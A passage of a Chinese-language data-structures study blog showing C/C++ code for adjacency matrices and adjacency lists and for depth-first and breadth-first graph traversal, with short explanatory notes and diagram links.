class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>     <br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    VerTexType adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br>     <br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br>     <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>     <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br>     <br>&#125;<br>     <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = amGraph-&gt;vexs[j];<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=amGraph-&gt;vexs[j];<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>     <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>有向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%80%86%E9%82%BB%E6%8E%A5%E8%A1%A8%E5%92%8C%E9%82%BB%E6%8E%A5%E8%A1%A8%E7%9A%84%E5%AF%B9%E6%AF%94.png"></p></li><li><p>邻接多重表</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E5%A4%9A%E9%87%8D%E8%A1%A8.png"></p><p>每个数字后面的空格都是，存放指针，用于连接</p><ul><li>连接顺序不唯一</li></ul></li><li><p>十字链表</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%8D%81%E5%AD%97%E9%93%BE%E8%A1%A8.png"></p><p>给顶点结点加一个指向出度边的指针</p><p>给狐结点添一个把该节点当成头节点的狐的数据域和指针域</p><p>优点：有利于找到出度和入度，通过<code>head</code>可以找到整个入度的边</p></li></ol><h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><ul><li><p>遍历的实质</p></li><li><p>怎么防止重复访问？</p><p>图中含有回路，而且每一个顶点都与其他顶点相通，所以可能通过某一个过程又回到了原来的点</p><blockquote><p>设置一个辅助的数组，用来标记每一个被访问的顶点，初始状态为<code>0</code></p><p>被访问了，就应该改变状态</p></blockquote><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86.png"></p></li></ul><h3 id="深度优先搜索（DFS）"><a href="#深度优先搜索（DFS）" class="headerlink" title="深度优先搜索（DFS）"></a>深度优先搜索（<code>DFS</code>）</h3><h4 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a><strong>邻接矩阵</strong></h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2.png"></p><ul><li><p>采取递归的方法</p></li><li><p>防止循环遍历，我们应该建立一个<code>visit</code>存放所有的结点，然后我们把遍历过的结点标识为<code>1</code></p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>  <br>  <br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>  <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<span class="hljs-comment">//无向边</span><br>  <br>&#125;<br>  <br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AMGraph *amGraph, <span class="hljs-type">int</span> visited[],<span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,amGraph-&gt;vexs[sub]);<br>    visited[sub]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[sub][i]!=<span class="hljs-number">0</span>&amp;&amp;visited[i]==<span class="hljs-number">0</span>)&#123;<br>            DFS(amGraph,visited,i);<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    DFS(amGraph,ints,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a><strong>邻接表</strong></h4><ul><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>  <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br>  <br>&#125;<br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = j;<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=j;<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-comment">/*void DFS(AMGraph *amGraph, int visited[],int sub) &#123;</span><br><span class="hljs-comment">    printf(&quot;%c&quot;,amGraph-&gt;vexs[sub]);</span><br><span class="hljs-comment">    visited[sub]=1;</span><br><span class="hljs-comment">    for (int i = 0; i &lt; amGraph-&gt;vexnum; ++i) &#123;</span><br><span class="hljs-comment">        if (amGraph-&gt;arcs[sub][i]!=0&amp;&amp;visited[i]==0)&#123;</span><br><span class="hljs-comment">            DFS(amGraph,visited,i);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br>  <br>  <br><span class="hljs-comment">//邻接表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AdjList adjList,<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> sub)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[sub].vex);<br>    ints[sub]=<span class="hljs-number">1</span>;<br>    EdgeNode *moveNode=adjList[sub].firstedge;<br>    <span class="hljs-keyword">while</span>(moveNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(ints[moveNode-&gt;adjvex]==<span class="hljs-number">0</span>)&#123;<br>            DFS(adjList,ints,moveNode-&gt;adjvex);<br>        &#125;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    DFS(adjList,ints,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>稠密图适用于邻接矩阵上进行深度遍历</p><p>稀疏图适用于在邻接表上深度遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/DFS%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E5%88%86%E6%9E%90.png"></p><h4 id="非连通图"><a href="#非连通图" class="headerlink" title="非连通图"></a>非连通图</h4><ol><li>可以想象成两个图，然后增加一个虚拟节点，将图穿起来</li><li>如果图的数量不是2个，那就只能在非第一次遍历的图中再选一个图的随机的一个节点开始遍历</li></ol><h3 id="广度优先搜索（BFS）"><a href="#广度优先搜索（BFS）" class="headerlink" title="广度优先搜索（BFS）"></a>广度优先搜索（BFS）</h3><h4 id="邻接矩阵-1"><a href="#邻接矩阵-1" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph, *pAMGraph;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creatGraph</span><span class="hljs-params">(pAMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph = <span class="hljs-keyword">new</span> AMGraph;<br>    amGraph-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>    &#125;<br>    amGraph-&gt;vexnum = num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            cin &gt;&gt; amGraph-&gt;arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph-&gt;arcnum++;<span class="hljs-comment">//计算边数</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    amGraph-&gt;arcnum /= <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">(pAMGraph amGraph, <span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> sub)</span> </span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt; queue;<br>    queue.<span class="hljs-built_in">push</span>(sub);<span class="hljs-comment">//先push，进入循环，但是记得在ints里面标记被push</span><br>    ints[sub]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[queue.<span class="hljs-built_in">front</span>()][i] == <span 